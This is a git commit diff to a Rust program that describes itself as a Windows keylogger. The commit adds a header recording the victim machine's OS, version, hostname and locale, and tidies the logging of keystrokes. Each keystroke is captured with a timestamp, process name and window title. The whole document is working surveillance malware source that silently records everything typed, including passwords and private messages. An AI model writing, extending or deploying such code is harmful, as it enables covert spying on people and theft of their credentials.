1fd54189ebbc7a19fe62a59badc8a6166540f177
thomaslienbacher <lienbacher.tom@gmail.com>
2018-12-29 14:48:27 +0100

    General info logging
    General information of the pc is now logged and release build are now much smaller in size

--- src/main.rs
+++ src/main.rs
@@ -4,6 +4,8 @@
 extern crate winapi;
 
 extern crate chrono;
+extern crate os_info;
+extern crate hostname;
 
 use std::fs::*;
 use std::io::*;
@@ -15,10 +17,33 @@ fn run(file: &mut File) {
     use winapi::ctypes::c_int;
     use winapi::um::processthreadsapi::OpenProcess;
     use winapi::um::psapi::GetProcessImageFileNameW;
+    use winapi::um::winnls::GetUserDefaultLocaleName;
     use winapi::shared::minwindef::DWORD;
     use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
     use std::{thread, time::Duration};
 
+    log_header(file);
+
+    let locale = unsafe {
+        const LEN: i32 = 64;
+        let mut buf = vec![0 as u16; LEN as usize];
+        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);
+
+        //find the null terminator
+        let mut len = 0;
+        buf.iter().enumerate().for_each(|(i, c)| {
+            if *c == 0 && len == 0 {
+                len = i;
+            }
+        });
+
+        String::from_utf16_lossy(buf[0..len].as_mut())
+    };
+
+    log(file, format!("Locale: {}\n", locale));
+    log(file, "\nKeylogs:\n".to_string());
+
+    //logging
     loop {
         thread::sleep(Duration::from_millis(10));
 
@@ -35,9 +60,9 @@ fn run(file: &mut File) {
         };
 
         let filename = unsafe {
-            const LEN: i32 = 255;
+            const LEN: u32 = 255;
             let mut buf = vec![0 as u16; LEN as usize];
-            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN as u32);
+            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);
 
             //find the null terminator
             let mut len = 0;
@@ -74,16 +99,33 @@ fn run(file: &mut File) {
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim(), keycode_to_string(i as u8));
 
-                #[cfg(debug_assertions)] {
-                    print!("{}", s);
-                }
-
-                match file.write(s.as_bytes()) {
-                    Err(e) => { println!("Couldn't write to log file: {}", e) }
-                    _ => {}
-                }
+                log(file, s);
             }
         }
+    }
+}
+
+fn log_header(file: &mut File) {
+    log(file, "~~~~~Logheader~~~~~\n".to_string());
+
+    let os_info = {
+        let info = os_info::get();
+        format!("OS: type: {}, version: {}\n", info.os_type(), info.version())
+    };
+    log(file, os_info);
+
+    let hostname = format!("Hostname: {}\n", hostname::get_hostname().unwrap_or("_NO_HOSTNAME_".to_string()));
+    log(file, hostname);
+}
+
+fn log(file: &mut File, s: String) {
+    #[cfg(debug_assertions)] {
+        print!("{}", s);
+    }
+
+    match file.write(s.as_bytes()) {
+        Err(e) => { println!("Couldn't write to log file: {}", e) }
+        _ => {}
     }
 }
 
@@ -236,7 +278,7 @@ fn get_mouse_pos() -> String {
     use winapi::shared::windef::POINT;
 
     let pos = unsafe {
-        let mut p: POINT = std::mem::zeroed();
+        let mut p = POINT { x: -1, y: -1 };
         GetCursorPos(&mut p);
         p
     };
@@ -246,7 +288,8 @@ fn get_mouse_pos() -> String {
 
 #[cfg(not(windows))]
 fn run(file: &mut File) {
-    file.write("Can't use this windows based keylogger".as_bytes());
+    log_header(file);
+    log(file, "This keylogger only works on windows".to_string());
 }
 
 fn main() {
